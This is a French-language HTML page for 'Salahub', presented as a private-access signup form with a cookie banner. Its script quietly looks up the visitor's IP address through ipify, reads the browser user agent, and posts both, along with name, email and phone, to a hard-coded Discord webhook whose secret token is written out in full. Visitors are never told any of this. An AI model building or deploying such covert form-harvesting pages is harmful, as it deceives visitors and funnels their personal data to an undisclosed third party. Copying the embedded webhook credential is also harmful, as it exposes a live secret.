<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Salahub</title>

<style>
body {
    margin: 0;
    font-family: 'Segoe UI', sans-serif;
    background: #0a0a0a;
    color: white;
}

/* HEADER */
header {
    text-align: center;
    padding: 40px;
}

header h1 {
    color: #ff2a2a;
}

/* FORM */
.container {
    display: flex;
    justify-content: center;
    align-items: center;
}

.card {
    background: #111;
    padding: 30px;
    border-radius: 15px;
    width: 320px;
    box-shadow: 0 0 20px rgba(255,0,0,0.2);
}

input {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    background: #1a1a1a;
    border: none;
    color: white;
    border-radius: 8px;
}

button {
    width: 100%;
    padding: 12px;
    background: linear-gradient(135deg, #ff0000, #990000);
    border: none;
    color: white;
    border-radius: 8px;
    cursor: pointer;
}

/* COOKIE */
.cookie-bar {
    position: fixed;
    bottom: 0;
    width: 100%;
    background: #111;
    padding: 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.cookie-bar button {
    background: red;
}
</style>
</head>

<body>

<header>
    <h1>Salahub</h1>
    <p>Accès privé</p>
</header>

<div class="container">
    <div class="card">
        <form id="form">
            <input type="text" id="nom" placeholder="Nom" required>
            <input type="text" id="prenom" placeholder="Prénom" required>
            <input type="email" id="email" placeholder="Email" required>
            <input type="tel" id="telephone" placeholder="Téléphone" required>
            <button>S'inscrire</button>
        </form>
    </div>
</div>

<!-- COOKIE -->
<div class="cookie-bar" id="cookieBar">
    <span>Nous utilisons des cookies pour améliorer votre expérience.</span>
    <button onclick="acceptCookies()">Accepter</button>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY";

// COOKIE STATUS
let cookieStatus = "Refusé";

function acceptCookies() {
    cookieStatus = "Accepté";
    localStorage.setItem("cookiesAccepted", "true");
    document.getElementById("cookieBar").style.display = "none";
}

if(localStorage.getItem("cookiesAccepted")) {
    cookieStatus = "Accepté";
    document.getElementById("cookieBar").style.display = "none";
}

// FORM
document.getElementById("form").addEventListener("submit", async function(e) {
    e.preventDefault();

    const nom = document.getElementById("nom").value;
    const prenom = document.getElementById("prenom").value;
    const email = document.getElementById("email").value;
    const telephone = document.getElementById("telephone").value;

    const date = new Date().toLocaleString();
    const userAgent = navigator.userAgent;

    let ip = "Inconnue";
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
    } catch {}

    const payload = {
        embeds: [{
            title: "📩 Nouvelle inscription Salahub",
            color: 16711680,
            fields: [
                { name: "Nom", value: nom, inline: true },
                { name: "Prénom", value: prenom, inline: true },
                { name: "Email", value: email },
                { name: "Téléphone", value: telephone },
                { name: "Cookies", value: cookieStatus },
                { name: "IP", value: ip },
                { name: "Navigateur", value: userAgent.substring(0,100) }
            ],
            footer: {
                text: "Date : " + date
            }
        }]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
    })
    .then(res => {
        if (res.ok) {
            alert("Inscription envoyée");
        } else {
            alert("Erreur");
        }
    });
});
</script>

</body>
</html>
